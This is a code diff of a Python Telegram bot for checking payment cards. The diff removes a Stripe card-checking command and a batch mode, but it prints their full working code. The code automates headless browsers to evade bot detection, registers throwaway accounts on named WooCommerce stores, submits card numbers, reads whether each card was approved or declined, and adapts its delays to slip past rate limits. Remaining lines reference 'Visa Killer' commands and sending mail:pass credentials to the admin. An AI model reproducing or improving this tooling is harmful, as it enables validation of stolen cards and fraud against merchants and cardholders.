@@ -58,7 +58,7 @@ start_time = datetime.now()
 USER_DB_FILE = "users.json"
 
 # Commands we gate
-CMD_KEYS = ("bin", "kill", "kd", "ko", "zz", "st", "bt", "au", "sort", "chk", "clean", "num", "adhar")
+CMD_KEYS = ("bin", "kill", "kd", "ko", "zz", "st", "bt", "sort", "chk", "clean", "num", "adhar")
 
 # Per-command approvals, plus a legacy/global "all" set
 approved_cmds = {k: set() for k in CMD_KEYS}
@@ -1204,7 +1204,6 @@ async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "🤖 *Card Bot Help*\n\n"
         "🔐 *Auth Commands:*\n"
         "• /st <card> - Stripe Auth V1\n"
-        "• /au <card> - Stripe Auth V2\n"
         "• /bt <card> - Braintree Auth-1\n"
         "• /chk <card> - Braintree Auth-2\n\n"
         "🗡️ *Visa Killer Commands:*\n"
@@ -1380,7 +1379,6 @@ async def cmds_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Auth Gates
     parts.append("🔐 *Auth Gates*\n" + "\n".join([
         lock("/st <card> — Stripe Auth V1", "st"),
-        lock("/au <card> — Stripe Auth V2 (single)", "au"),
         lock("/bt <card> — Braintree Auth-1", "bt"),
         lock("/chk <card> — Braintree Auth-2 (Under Development)", "chk"),
     ]))
@@ -3811,21 +3809,14 @@ async def zz_cmd(update, context):
     }
     Process(target=run_zz_process, args=(card_input, update_dict), daemon=True).start()
 
-# ==== 8. STRIPE AUTH V1 (/st) — Single + Batch Mode ==== #
+# ==== 8. STRIPE AUTH V1 (/st) — Single Only (batch removed) ==== #
 def extract_all_card_inputs(raw_text: str):
     t = (raw_text or "").replace("\r", "\n")
     t = t.replace("/", "|").replace("\\", "|").replace(" ", "|")
     return re.findall(r"\d{12,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}", t)
 
-def run_st_process(payload, update_dict):
-    asyncio.run(st_router(payload, update_dict))
-
-async def st_router(payload, update_dict):
-    if isinstance(payload, list) and len(payload) > 1:
-        await st_batch_main(payload, update_dict)
-    else:
-        card_input = payload[0] if isinstance(payload, list) else payload
-        await st_single_main(card_input, update_dict)
+def run_st_process(card_input, update_dict):
+    asyncio.run(st_single_main(card_input, update_dict))
 
 def _wait_for_stripe_iframe(driver, timeout=12):
     """Wait until *any* Stripe Elements iframe appears."""
@@ -4241,199 +4232,6 @@ async def st_single_main(card_input, update_dict):
         except:
             pass
 
-# ---------- BATCH MODE (adaptive cooldown) ----------
-async def st_batch_main(cards, update_dict):
-    uid = update_dict["user_id"]
-    chat_id = update_dict["chat_id"]
-    msg_id = update_dict["message_id"]
-    username = update_dict.get("username", "User")
-    bot = Bot(BOT_TOKEN)
-
-    try:
-        ua = UserAgent().random if UserAgent else "Mozilla/5.0 Chrome/118"
-        options = webdriver.ChromeOptions()
-        options.binary_location = CHROME_PATH
-        options.add_argument(f"user-agent={ua}")
-        options.add_argument("--disable-blink-features=AutomationControlled")
-        options.add_argument("--headless=new")
-        options.add_argument("--no-sandbox")
-        options.add_argument("--disable-dev-shm-usage")
-        options.add_argument("--window-size=1920,1080")
-        options.add_experimental_option("excludeSwitches", ["enable-automation"])
-        options.add_experimental_option('useAutomationExtension', False)
-
-        service = Service(executable_path=CHROME_DRIVER_PATH)
-        driver = webdriver.Chrome(service=service, options=options)
-        wait = WebDriverWait(driver, 15)
-
-        email = f"user{random.randint(10000,99999)}@example.com"
-        password = f"Pass{random.randint(1000,9999)}!"
-        start_time = time.time()
-
-        driver.get("https://www.shoprootscience.com/my-account/add-payment-method")
-        wait.until(EC.element_to_be_clickable((By.ID, "reg_email"))).send_keys(email)
-        driver.find_element(By.ID, "reg_password").send_keys(password)
-        driver.find_element(By.NAME, "register").click()
-        time.sleep(3)
-
-        consolidated = []
-        prev_was_approved = False
-
-        # Adaptive cooldown settings
-        adaptive_delay = 7
-        MIN_DELAY = 6
-        MAX_DELAY = 30
-
-        for card_input in cards:
-            parsed = parse_card_input(card_input)
-            if not parsed:
-                consolidated.append(
-                    f"💳 `{card_input}`\n📩 Response: `Invalid format`\n📟 Status: ❌ Declined"
-                )
-                prev_was_approved = False
-                time.sleep(adaptive_delay)
-                # Decay delay gently after a normal decline
-                adaptive_delay = max(MIN_DELAY, int(adaptive_delay * 0.85))
-                continue
-
-            card, mm, yy, cvv = parsed
-            full_card = f"{card}|{mm}|20{yy}|{cvv}"
-            expiry = f"{mm}/{yy}"
-
-            # Ensure the Add Payment form is open and iframes are present
-            if prev_was_approved:
-                if not _open_add_payment_form(driver, wait):
-                    raise Exception("Add Payment form did not appear after approval")
-            else:
-                if not _wait_for_stripe_iframe(driver, 6):
-                    driver.get("https://www.shoprootscience.com/my-account/add-payment-method")
-                    if not _wait_for_stripe_iframe(driver, 10):
-                        raise Exception("Add Payment form did not load")
-
-            # Fill + submit with one-shot recovery if iframes weren't ready
-            try:
-                _fill_stripe_fields_adaptive(driver, wait, card, expiry, cvv, clear_first=not prev_was_approved)
-            except Exception:
-                _open_add_payment_form(driver, wait)
-                if not _wait_for_stripe_iframe(driver, 10):
-                    raise
-                _fill_stripe_fields_adaptive(driver, wait, card, expiry, cvv, clear_first=True)
-
-            # Opt-out of "Save my information for faster checkout" (Link) to avoid phone requirement
-            try:
-                _st_opt_out_faster_checkout(driver)
-            except Exception:
-                pass
-
-            wait.until(EC.element_to_be_clickable((By.ID, "place_order"))).click()
-
-            # Poll for message
-            status = "Declined"
-            response_text = None
-            for _ in range(10):
-                try:
-                    success = driver.find_element(By.CSS_SELECTOR, "div.woocommerce-message")
-                    if "successfully added" in success.text.lower():
-                        status = "Approved"
-                        response_text = success.text.strip()
-                        break
-                except:
-                    pass
-                try:
-                    error = driver.find_element(By.CSS_SELECTOR, "ul.woocommerce-error li")
-                    response_text = error.text.strip()
-                    break
-                except:
-                    pass
-                time.sleep(0.5)
-            if not response_text:
-                response_text = "Unknown"
-
-            # If site says "too soon", back off & retry this same card once
-            if _is_too_soon(response_text):
-                backoff = min(int(adaptive_delay * 1.5) + 2, MAX_DELAY)
-                time.sleep(backoff)
-
-                try:
-                    if not _open_add_payment_form(driver, wait):
-                        driver.get("https://www.shoprootscience.com/my-account/add-payment-method")
-                        _wait_for_stripe_iframe(driver, 10)
-
-                    _fill_stripe_fields_adaptive(driver, wait, card, expiry, cvv, clear_first=True)
-                    wait.until(EC.element_to_be_clickable((By.ID, "place_order"))).click()
-
-                    # Re-evaluate after retry
-                    status = "Declined"
-                    response_text = None
-                    for _ in range(10):
-                        try:
-                            success = driver.find_element(By.CSS_SELECTOR, "div.woocommerce-message")
-                            if "successfully added" in success.text.lower():
-                                status = "Approved"
-                                response_text = success.text.strip()
-                                break
-                        except:
-                            pass
-                        try:
-                            error = driver.find_element(By.CSS_SELECTOR, "ul.woocommerce-error li")
-                            response_text = error.text.strip()
-                            break
-                        except:
-                            pass
-                        time.sleep(0.5)
-                    if not response_text:
-                        response_text = "Unknown"
-                except:
-                    # ignore errors on retry — continue with whatever we have
-                    pass
-
-                # Increase base delay for the next cards (gentle exponential backoff)
-                adaptive_delay = min(int(adaptive_delay * 1.4) + 1, MAX_DELAY)
-
-            elif status == "Approved":
-                # Approvals often trigger tighter anti-spam — nudge delay up a bit
-                adaptive_delay = min(max(adaptive_delay + 1, MIN_DELAY + 1), MAX_DELAY)
-            else:
-                # Normal: slowly decay toward a floor
-                adaptive_delay = max(MIN_DELAY, int(adaptive_delay * 0.85))
-
-            consolidated.append(
-                f"💳 `{full_card}`\n📩 Response: `{response_text}`\n📟 Status: {'✅' if status=='Approved' else '❌'} {status}"
-            )
-            prev_was_approved = (status == "Approved")
-
-            # Adaptive cooldown before next card
-            time.sleep(adaptive_delay)
-
-        took = f"{time.time() - start_time:.2f}s"
-        final_msg = "\n\n".join(consolidated) + f"\n\n🌐 Gateway: Stripe-Auth-1\n⏱ Took: {took}\n🧑‍💻 Checked by: **{username}** [`{uid}`]"
-        await bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=final_msg, parse_mode="Markdown")
-
-    except Exception:
-        await bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text="❌ Process failed.", parse_mode="Markdown")
-        # Send screenshot + trace to admin (best-effort)
-        try:
-            await _st_send_admin_screenshot(
-                bot,
-                driver if "driver" in locals() else None,
-                "ST Batch Error (screenshot)",
-            )
-        except Exception:
-            pass
-        try:
-            await bot.send_message(
-                chat_id=BOT_ADMIN_ID,
-                text=f"ST Batch Error:\n```\n{traceback.format_exc()[:3500]}\n```",
-                parse_mode="Markdown",
-            )
-        except Exception:
-            pass
-    finally:
-        try:
-            driver.quit()
-        except:
-            pass
-
 async def st_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     uname = update.effective_user.first_name or "User"
@@ -4456,14 +4254,16 @@ async def st_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ No valid card found.\nUse: `/st 4111111111111111|08|25|123`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
         return
 
-    if len(cards) > 10:
-        await update.message.reply_text("⚠️ You can send a maximum of 10 cards at once.", reply_to_message_id=update.message.message_id)
+    if len(cards) > 1:
+        await update.message.reply_text(
+            "⚠️ Batch mode has been removed for `/st`.\nSend only **one** card at a time.\n\nUse: `/st 4111111111111111|08|25|123`",
+            parse_mode="Markdown",
+            reply_to_message_id=update.message.message_id,
+        )
         return
 
-    if len(cards) == 1:
-        msg = await update.message.reply_text(f"💳 `{cards[0]}`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
-    else:
-        msg = await update.message.reply_text(f"⏳ Mass checking **{len(cards)}** cards…", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
+    card_input = cards[0]
+    msg = await update.message.reply_text(f"💳 `{card_input}`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
 
     update_dict = {
         "user_id": uid,
@@ -4471,7 +4271,7 @@ async def st_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "message_id": msg.message_id,
         "username": uname,
     }
-    Process(target=run_st_process, args=(cards if len(cards) > 1 else cards[0], update_dict), daemon=True).start()
+    Process(target=run_st_process, args=(card_input, update_dict), daemon=True).start()
 
 # ==== 9. /bt Command (with mail:pass send to admin) ====
 def run_bt_check(card_str, chat_id, message_id):
@@ -4792,434 +4592,6 @@ async def chk_cmd(update, context):
 
     # Simple response indicating under development
     msg = await update.message.reply_text(f"💳 `{card_input}`\n🔒 *Braintree Auth V2* - Currently under development\n\n⚠️ This feature is being optimized for better performance and reliability. Check back soon!", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
-
-# ==== 11. /au Command (Stripe Auth V2, single) ====
-def run_au_process(card_input, update_dict):
-    asyncio.run(au_main(card_input, update_dict))
-
-async def au_main(card_input, update_dict):
-    import tempfile
-    import shutil
-
-    uid = update_dict["user_id"]
-    chat_id = update_dict["chat_id"]
-    msg_id = update_dict["message_id"]
-    username = update_dict.get("username", "User")
-    bot = Bot(BOT_TOKEN)
-    start_time = time.time()
-    ajax_debug = None
-
-    parsed = parse_card_input(card_input)
-    if not parsed:
-        await bot.edit_message_text(
-            chat_id=chat_id, message_id=msg_id,
-            text="❌ Invalid format.\nUse: `/au 4111111111111111|08|26|123`",
-            parse_mode="Markdown"
-        )
-        return
-
-    card, mm, yy, cvv = parsed
-    expiry = f"{mm}/{yy}"
-    full_card = f"{card}|{mm}|20{yy}|{cvv}"
-    bin_info, bin_details = get_bin_info(card[:6])
-    bin_flag = (bin_details or {}).get("country_flag", "")
-    temp_profile_dir = tempfile.mkdtemp()
-
-    try:
-        def _enable_network_capture(driver):
-            """
-            Best-effort enable CDP Network domain so we can pull admin-ajax raw responses.
-            This requires chrome performance logging enabled at driver startup.
-            """
-            try:
-                driver.execute_cdp_cmd("Network.enable", {})
-            except Exception:
-                pass
-            try:
-                driver.execute_cdp_cmd("Page.enable", {})
-            except Exception:
-                pass
-
-        def _wait_admin_ajax_raw(driver, timeout=10):
-            """
-            Collect the latest admin-ajax.php XHR/Fetch response (status + raw body).
-            Returns dict or None.
-            """
-            end = time.time() + timeout
-            seen = set()
-            last = None
-            while time.time() < end:
-                try:
-                    logs = driver.get_log("performance")
-                except Exception:
-                    logs = []
-
-                for entry in logs:
-                    try:
-                        msg = json.loads(entry.get("message", "")).get("message", {})
-                        if msg.get("method") != "Network.responseReceived":
-                            continue
-                        params = msg.get("params", {}) or {}
-                        resp = params.get("response", {}) or {}
-                        url = resp.get("url", "") or ""
-                        if "admin-ajax" not in url:
-                            continue
-                        req_id = params.get("requestId")
-                        if not req_id or req_id in seen:
-                            continue
-                        seen.add(req_id)
-                        last = {
-                            "requestId": req_id,
-                            "url": url,
-                            "status": int(resp.get("status", 0) or 0),
-                        }
-                    except Exception:
-                        continue
-
-                if last:
-                    break
-                time.sleep(0.4)
-
-            if not last:
-                return None
-
-            body = ""
-            try:
-                out = driver.execute_cdp_cmd("Network.getResponseBody", {"requestId": last["requestId"]})
-                body = (out or {}).get("body", "") or ""
-            except Exception:
-                body = ""
-
-            # Trim to keep Telegram safe
-            if len(body) > 3500:
-                body = body[:3500] + "\n... (truncated)"
-
-            return {
-                "url": last.get("url", ""),
-                "status": last.get("status", 0),
-                "body": body,
-            }
-
-        def _fill_zipcode(driver):
-            """
-            WooCommerce add-payment-method pages sometimes require ZIP/postcode outside Stripe.
-            Best-effort fill.
-            """
-            zip_value = "10001"
-            candidates = [
-                "input#billing_postcode",
-                "input[name='billing_postcode']",
-                "input#postcode",
-                "input[name='postcode']",
-                "input[name*='post']",
-                "input[id*='post']",
-            ]
-            for sel in candidates:
-                try:
-                    elts = driver.find_elements(By.CSS_SELECTOR, sel)
-                    if not elts:
-                        continue
-                    el = elts[0]
-                    try:
-                        driver.execute_script("arguments[0].scrollIntoView({block:'center'});", el)
-                    except Exception:
-                        pass
-                    try:
-                        el.click()
-                    except Exception:
-                        pass
-                    try:
-                        el.clear()
-                    except Exception:
-                        pass
-                    el.send_keys(zip_value)
-                    return True
-                except Exception:
-                    continue
-            return False
-
-        def _fill_link_contact_fields(driver, email_value: str) -> None:
-            """
-            Stripe Link UI may require email/phone before enabling submit.
-            Best-effort fill any visible email/tel fields in the main document.
-            """
-            driver.switch_to.default_content()
-            # Email
-            try:
-                for sel in (
-                    "input[type='email']",
-                    "input[name*='email']",
-                    "input[id*='email']",
-                ):
-                    for el in driver.find_elements(By.CSS_SELECTOR, sel):
-                        try:
-                            if not el.is_displayed() or not el.is_enabled():
-                                continue
-                            v = (el.get_attribute("value") or "").strip()
-                            if v:
-                                continue
-                            driver.execute_script("arguments[0].scrollIntoView({block:'center'});", el)
-                            el.click()
-                            el.send_keys(email_value)
-                            raise StopIteration
-                        except StopIteration:
-                            raise
-                        except Exception:
-                            continue
-            except StopIteration:
-                pass
-            except Exception:
-                pass
-
-            # Phone
-            phone_value = f"2015550{random.randint(100, 999)}"
-            try:
-                for sel in (
-                    "input[type='tel']",
-                    "input[name*='phone']",
-                    "input[id*='phone']",
-                ):
-                    for el in driver.find_elements(By.CSS_SELECTOR, sel):
-                        try:
-                            if not el.is_displayed() or not el.is_enabled():
-                                continue
-                            v = (el.get_attribute("value") or "").strip()
-                            if v:
-                                continue
-                            driver.execute_script("arguments[0].scrollIntoView({block:'center'});", el)
-                            el.click()
-                            el.send_keys(phone_value)
-                            raise StopIteration
-                        except StopIteration:
-                            raise
-                        except Exception:
-                            continue
-            except StopIteration:
-                pass
-            except Exception:
-                pass
-
-        ua = UserAgent().random if UserAgent else "Mozilla/5.0 Chrome/118"
-        options = webdriver.ChromeOptions()
-        options.binary_location = CHROME_PATH
-        options.add_argument(f"--user-data-dir={temp_profile_dir}")
-        options.add_argument(f"user-agent={ua}")
-        options.add_argument("--disable-blink-features=AutomationControlled")
-        options.add_argument("--headless=new")
-        options.add_argument("--no-sandbox")
-        options.add_argument("--disable-dev-shm-usage")
-        options.add_argument("--window-size=1920,1080")
-        options.add_experimental_option("excludeSwitches", ["enable-automation"])
-        options.add_experimental_option('useAutomationExtension', False)
-        # Enable performance logs so we can capture admin-ajax raw responses
-        try:
-            options.set_capability("goog:loggingPrefs", {"performance": "ALL"})
-            options.set_capability("goog:perfLoggingPrefs", {"enableNetwork": True, "enablePage": False})
-        except Exception:
-            pass
-
-        service = Service(executable_path=CHROME_DRIVER_PATH)
-        driver = webdriver.Chrome(service=service, options=options)
-        wait = WebDriverWait(driver, 20)
-        _enable_network_capture(driver)
-
-        # STEP 1: Register with random email (real-looking domain)
-        email = random_email()
-        driver.get("https://potatoprincesses.com/my-account/add-payment-method/")
-
-        try:
-            wait.until(EC.element_to_be_clickable((By.ID, "reg_email"))).send_keys(email)
-            driver.find_element(By.NAME, "register").click()
-        except Exception as e:
-            raise Exception(f"Account register step failed: {e}")
-
-        # STEP 2: Ensure add-payment form + Stripe fields are loaded
-        try:
-            _open_add_payment_form(driver, wait)
-        except Exception:
-            # Best-effort: proceed anyway (sometimes page already has the form)
-            pass
-
-        # STEP 3: Fill card, expiry, cvv in Stripe iframes (adaptive, works even if iframes change)
-        try:
-            _fill_stripe_fields_adaptive(driver, wait, card, expiry, cvv, clear_first=True)
-        except Exception as e:
-            raise Exception(f"❌ Failed to fill Stripe fields: {e}")
-
-        # STEP 3.5: Fill ZIP/postcode (required on some flows)
-        try:
-            _fill_zipcode(driver)
-        except Exception:
-            pass
-
-        # Some Stripe/Link flows require opting out of "faster checkout" + contact fields
-        try:
-            _st_opt_out_faster_checkout(driver)
-        except Exception:
-            pass
-        try:
-            _fill_link_contact_fields(driver, email)
-        except Exception:
-            pass
-
-        # STEP 4: Scroll a bit and click Add Payment Method
-        try:
-            from selenium.common.exceptions import ElementClickInterceptedException
-
-            driver.switch_to.default_content()
-            place_btn = wait.until(EC.presence_of_element_located((By.ID, "place_order")))
-            try:
-                driver.execute_script("arguments[0].scrollIntoView({block:'center'});", place_btn)
-            except Exception:
-                driver.execute_script("window.scrollBy(0, 250);")
-
-            # If Link overlays are open, ESC often dismisses them
-            try:
-                ActionChains(driver).send_keys(Keys.ESCAPE).perform()
-            except Exception:
-                pass
-
-            # Wait briefly for enablement (some pages disable submit until phone/email)
-            try:
-                WebDriverWait(driver, 6).until(
-                    lambda d: place_btn.is_enabled() and not place_btn.get_attribute("disabled")
-                )
-            except Exception:
-                pass
-
-            try:
-                place_btn.click()
-            except ElementClickInterceptedException:
-                try:
-                    driver.execute_script("arguments[0].click();", place_btn)
-                except Exception:
-                    ActionChains(driver).move_to_element(place_btn).click().perform()
-            # Capture raw admin-ajax response (debug) right after submit
-            try:
-                ajax_debug = _wait_admin_ajax_raw(driver, timeout=10)
-            except Exception:
-                ajax_debug = None
-        except Exception as e:
-            raise Exception(f"Clicking Add payment method failed: {e}")
-
-        # STEP 5: Wait and parse for result message (auto-adjust wait)
-        status = "Declined"
-        response_text = None
-        for _ in range(18):
-            try:
-                success = driver.find_element(By.CSS_SELECTOR, "div.woocommerce-message")
-                if "successfully added" in success.text.lower() or "added" in success.text.lower():
-                    status = "Approved"
-                    response_text = success.text.strip()
-                    break
-            except: pass
-            try:
-                error = driver.find_element(By.CSS_SELECTOR, "ul.woocommerce-error li")
-                response_text = error.text.strip()
-                break
-            except: pass
-            time.sleep(0.4)
-        if not response_text:
-            response_text = "Unknown"
-
-        took = f"{time.time() - start_time:.2f}s"
-        emoji = "✅" if status == "Approved" else "❌"
-        result_msg = (
-            f"💳 **Card:** `{full_card}`\n"
-            f"🏦 **BIN:** `{bin_info}` {bin_flag}\n"
-            f"📟 **Status:** {emoji} **{status}**\n"
-            f"📩 **Response:** `{response_text}`\n"
-            f"🌐 **Gateway:** **Stripe-Auth-V2**\n"
-            f"⏱ **Took:** **{took}**\n"
-            f"🧑‍💻 **Checked by:** **{username}** [`{uid}`]"
-        )
-        await bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=result_msg, parse_mode="Markdown")
-
-        # Send raw admin-ajax debug to admin (best-effort)
-        try:
-            if ajax_debug:
-                await bot.send_message(
-                    chat_id=BOT_ADMIN_ID,
-                    text=(
-                        "AU admin-ajax raw response\n"
-                        f"💳 `{full_card}`\n"
-                        f"🏦 `{bin_info}` {bin_flag}\n"
-                        f"🌐 `{ajax_debug.get('url','')}`\n"
-                        f"📟 `{ajax_debug.get('status',0)}`\n"
-                        f"```{(ajax_debug.get('body','') or '')[:3500]}```"
-                    ),
-                    parse_mode="Markdown",
-                )
-        except Exception:
-            pass
-
-    except Exception as exc:
-        screenshot = "au_fail.png"
-        try:
-            driver.save_screenshot(screenshot)
-        except: pass
-        await bot.edit_message_text(chat_id=chat_id, message_id=msg_id,
-            text="❌ Stripe Auth V2 process failed.", parse_mode="Markdown")
-        trace = traceback.format_exc()
-        trace_caption = f"```\n{trace[:950]}\n```"
-        # If we have admin-ajax debug, include it in the admin report (best-effort)
-        try:
-            if ajax_debug:
-                dbg = (
-                    "\n\nAU admin-ajax debug\n"
-                    f"URL: {ajax_debug.get('url','')}\n"
-                    f"STATUS: {ajax_debug.get('status',0)}\n"
-                    f"BODY:\n{(ajax_debug.get('body','') or '')[:1200]}"
-                )
-                trace_caption = f"```\n{(trace[:850] + dbg)[:950]}\n```"
-        except Exception:
-            pass
-        try:
-            await bot.send_photo(chat_id=BOT_ADMIN_ID,
-                photo=open(screenshot, "rb") if os.path.exists(screenshot) else None,
-                caption=trace_caption,
-                parse_mode="Markdown")
-        except:
-            await bot.send_message(chat_id=BOT_ADMIN_ID,
-                text=f"Stripe Auth V2 failed for user {uid}.\n{trace_caption}",
-                parse_mode="Markdown")
-        if os.path.exists(screenshot):
-            os.remove(screenshot)
-    finally:
-        try:
-            driver.quit()
-            shutil.rmtree(temp_profile_dir, ignore_errors=True)
-        except: pass
-
-async def au_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    uid = update.effective_user.id
-    uname = update.effective_user.first_name or "User"
-
-    if not is_approved(uid, "au"):
-        await update.message.reply_text("⛔ You are not approved to use this command.", reply_to_message_id=update.message.message_id)
-        return
-    
-    if not is_cmd_enabled("au"):
-        await update.message.reply_text("⚠️ This command is currently disabled by admin.", reply_to_message_id=update.message.message_id)
-        return
-
-    raw_input = " ".join(context.args).strip() if context.args else ""
-    if not raw_input and update.message.reply_to_message:
-        raw_input = (update.message.reply_to_message.text or "").strip()
-
-    card_input = extract_card_input(raw_input)
-    if not card_input:
-        await update.message.reply_text("❌ No valid card found.\nUse: `/au 4111111111111111|08|26|123`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
-        return
-
-    msg = await update.message.reply_text(f"💳 `{card_input}`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
-    update_dict = {
-        "user_id": uid,
-        "chat_id": update.effective_chat.id,
-        "message_id": msg.message_id,
-        "username": uname,
-    }
-    Process(target=run_au_process, args=(card_input, update_dict), daemon=True).start()
 
 # ==== 12. /sort COMMAND (Fixed Card Sorting & Cleaning) ====
 def extract_and_clean_cards_sort(data_text):
@@ -5932,7 +5304,6 @@ async def main():
         app.add_handler(CommandHandler("ko", ko_cmd))
         app.add_handler(CommandHandler("zz", zz_cmd))
         app.add_handler(CommandHandler("st", st_cmd))
-        app.add_handler(CommandHandler("au", au_cmd))
         app.add_handler(CommandHandler("bt", bt_cmd))
         app.add_handler(CommandHandler("chk", chk_cmd))
 
